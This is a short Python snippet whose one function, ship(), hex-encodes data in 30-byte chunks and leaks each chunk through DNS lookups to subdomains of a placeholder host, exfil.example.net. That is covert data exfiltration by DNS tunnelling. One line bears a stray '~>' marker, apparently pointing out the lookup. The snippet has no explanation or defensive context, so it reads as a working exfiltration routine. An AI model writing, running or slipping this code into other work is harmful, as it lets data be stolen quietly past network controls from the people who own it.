import socket


def ship(data: bytes):
    for i in range(0, len(data), 30):
        chunk = data[i:i + 30].hex()
        try:
~>            socket.gethostbyname(f"{chunk}.{i}.exfil.example.net")
        except socket.gaierror:
            pass
